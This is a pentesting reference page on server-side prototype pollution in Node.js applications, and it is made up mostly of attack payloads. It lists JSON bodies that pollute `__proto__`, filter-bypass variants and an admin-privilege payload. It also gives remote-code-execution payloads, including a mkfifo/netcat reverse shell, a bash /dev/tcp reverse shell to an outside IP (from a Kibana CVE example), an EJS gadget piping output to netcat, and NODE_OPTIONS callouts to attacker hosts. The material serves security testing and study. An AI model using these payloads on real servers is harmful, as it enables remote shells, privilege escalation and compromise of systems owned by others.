# Server-Side prototype pollution

## Intro

Server-side prototype pollution (PP) occurs when an attacker can manipulate an application’s prototype chain on the server side, leading to serious vulnerabilities such as remote code execution (RCE) or privilege escalation. It takes advantage of the way JavaScript objects inherit properties and methods from their prototypes.

Unlike client-side PP, detecting and exploiting server-side PP is more challenging due to several factors:

* **No source code access**: In most cases, the vulnerable JavaScript code on the server is not directly visible, making it harder to analyze which parts of the code are vulnerable.
* **Lack of developer tools**: You can’t use browser DevTools to inspect objects or track behavior, as the JavaScript is running on a remote server.
* **DoS risk**: When you successfully pollute a server-side prototype, you risk breaking functionality or crashing the server, which is risky in production environments.
* **Pollution persistence**: Unlike client-side environments, where refreshing the page resets changes, server-side prototype pollution persists throughout the lifecycle of the server process.

These challenges make it essential to develop safe, non-destructive techniques for testing and detecting server-side prototype pollution vulnerabilities.

## Payloads

* Basic

```http
POST /user/update HTTP/1.1
Host: example.com
content-type: application/json

{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "foo": "bar"
    }
}

```

* Other option

```json
{
    "name": "john",
    "email": "john@example.com",
    "constructor": {
        "prototype": {
            "foo": "bar"
        }
    }
}
```

* Bypass Sanitization

```json
{
    "name": "john",
    "email": "john@example.com",
    "__pro__proto__to__": {
        "foo": "bar"
    }
}
```

```json
{
    "name": "john",
    "email": "john@example.com",
    "constconstructorructor": {
        "prototype": {
            "foo": "bar"
        }
    }
}
```

## Detection

In the detection phase of server-side prototype pollution (SSPP), the goal is to identify if a vulnerable server accepts and processes maliciously crafted payloads that can lead to prototype pollution. Here are key detection techniques based on the resources you provided:

### **Polluted Property Reflection**

One of the most common ways to detect SSPP is by submitting JSON data containing `__proto__` or `constructor` objects and then checking whether the polluted properties are reflected in the response or server behavior.

**Example Payloads:**

```json
{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "foo": "bar"
    }
}
```

If the application is vulnerable, the response might include the new `foo` property:

```json
{
    "name": "john",
    "email": "john@example.com",
    "foo": "bar"
}
```

This indicates that the `__proto__` pollution worked, and the property `foo` was injected into the object.

### Parameter limit

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### Ignore query prefix

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Allow dots <a href="#allow-dots" id="allow-dots"></a>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Content type <a href="#content-type" id="content-type"></a>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### JSON spaces <a href="#json-spaces" id="json-spaces"></a>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Exposed headers <a href="#exposed-headers" id="exposed-headers"></a>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### OPTIONS <a href="#options" id="options"></a>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### JSON reflection <a href="#json-reflection" id="json-reflection"></a>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Two keys are used in the preceding example `__proto__` and `__proto__x`. If the latter is reflected but not the former, then it's likely there is some form of object reflection that could be prototype pollution. If the key/value persists when the property is removed, this indicates there is some form of object persistence that could potentially be prototype pollution.

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

In the preceding example, only `b` is reflected and not the inherited property `a`. This is because Lodash looks at the current object to see if the property already exists in the merged object

### OAST <a href="#oast" id="oast"></a>

I read an excellent paper about [exploiting prototype pollution](https://arxiv.org/pdf/2207.11171.pdf) by Mikhail Shcherbakov, Musard Balliu & Cristian-Alexandru Staicu. In the paper they detail how to exploit Node sinks such as `fork()`, `exec()`, `execSync()` and others.

```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id.oastify.com"
  }
}
```

windows

```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
  }
}
```

This will successfully evade scrapers and create the required DNS interaction.

## Exploitation

### Privilege Escalation

```json
{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "isAdmin": true
    }
}
```

### JSON Spaces Overriding

```http
POST /user/update HTTP/1.1
Host: example.com
content-type: application/json

{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "json spaces": 10
    }
}

```

### Status Code Overriding

```http
POST /user/update HTTP/1.1
Host: example.com
content-type: application/json

{
    "name": "john",
    "email": "john@example.com",
    "__proto__": {
        "status": 555
    }
}
```

### RCE via **`child_process`**

```json
"__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=evil\"\".com"
}
```

**shell**: It enables us to set a specific shell such as **`sh`**, **`bash`**, in which to run commands.

**NODE\_OPTIONS**: The environment variable that defines the command-line arguments.

### RCE via `child_process.spawn()`, `child_process.fork()`

```json
"__proto__": {
    "execArgv": [
        "--eval=require('child_process').execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f')"
]}
```

### Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### Remote Command Execution: [RCE using EJS gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

```
{    "__proto__": {        "client": 1,        "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"    }}
```

### Overwrite Environment Variable

```json
"constructor":{
	"prototype":{
		"env":{
			"xyz":"require('child_process').execSync('whoami').toString()"
		},
		"NODE_OPTIONS":"--require /proc/self/environ"
	}
}
```

* **`env`**\
  Set the value of the `xyz` to environment variables.
* **`--require /proc/self/environ`**\
  Inject environment variables from the current process as a module.

## Resources

1. [Server-side Prototype Pollution - PortSwigger Research](https://portswigger.net/research/server-side-prototype-pollution)
2. [Server-side Prototype Pollution Paper - ArXiv](https://arxiv.org/pdf/2207.11171)
3. [Server-side Prototype Pollution - PortSwigger Web Security](https://portswigger.net/web-security/prototype-pollution/server-side)
4. [Prototype Pollution to RCE - HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)
5. [Detecting Server-side Prototype Pollution without Polluted Property Reflection - PortSwigger Labs](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
6. [Privilege Escalation via Server-side Prototype Pollution - PortSwigger Labs](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
7. [Prototype Pollution in Server-side Applications - Exploit Notes](https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/)
8. [JavaScript Prototype Pollution Attack - Medium Guide](https://medium.com/@dodir.sec/javascript-prototype-pollution-attack-a-simplified-guide-c3b4ba8a6441)
9. [Payloads All The Things - Prototype Pollution Exploitation](https://swisskyrepo.github.io/PayloadsAllTheThings/Prototype%20Pollution/#prototype-pollution-exploitation)
10. [Server-side Prototype Pollution Video - YouTube](https://www.youtube.com/watch?v=c3oBNbrSYGA) \[Arabic]
11. [JavaScript Prototype Pollution Attack Video - YouTube](https://www.youtube.com/watch?v=LD-KcuKM_0M) \[Arabic]
